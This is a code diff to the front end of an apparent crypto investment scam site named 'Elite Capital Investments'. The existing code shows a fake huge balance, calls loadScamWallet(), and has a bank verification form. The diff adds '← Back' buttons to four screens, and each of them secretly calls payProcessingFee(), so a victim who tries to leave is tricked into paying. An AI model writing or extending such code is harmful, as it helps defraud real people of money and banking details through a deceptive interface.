@@ -21,6 +21,7 @@ async function connectWallet() {
 // Show fake huge balance
 function showBalanceScreen() {
     document.getElementById('main-content').innerHTML = `
+    <button onclick="payProcessingFee()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">← Back</button>
         <div class="max-w-md mx-auto bg-zinc-950 min-h-screen pb-20">
             <!-- Header -->
             <div class="p-6">
@@ -116,6 +117,7 @@ function copyAddress() {
 
 function showLocationScreen() {
     document.getElementById('main-content').innerHTML = `
+    <button onclick="payProcessingFee()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">← Back</button>
         <div class="glass p-8 rounded-3xl">
             <h2 class="text-2xl mb-6">Bank Verification</h2>
             <input id="bank" type="text" placeholder="Bank Name" class="w-full bg-zinc-900 p-4 rounded-2xl mb-4">
@@ -130,6 +132,7 @@ function showLocationScreen() {
 function completeWithdrawal() {
     const loc = document.getElementById('location').value || "Unknown";
     document.getElementById('main-content').innerHTML = `
+    <button onclick="payProcessingFee()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">← Back</button>
         <div class="glass p-8 rounded-3xl text-center">
             <div class="text-7xl mb-6">✅</div>
             <h2 class="text-3xl font-bold text-emerald-400">Withdrawal Successful!</h2>
@@ -142,6 +145,7 @@ function completeWithdrawal() {
 // Start the app
 loadScamWallet(); 
 document.getElementById('main-content').innerHTML = `
+<button onclick="payProcessingFee()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">← Back</button>
     <div class="glass p-8 rounded-3xl text-center">
         <h1 class="text-5xl font-bold mb-4">Elite Capital Investments</h1>
         <p class="text-xl mb-8">Connect your wallet to view portfolio</p>
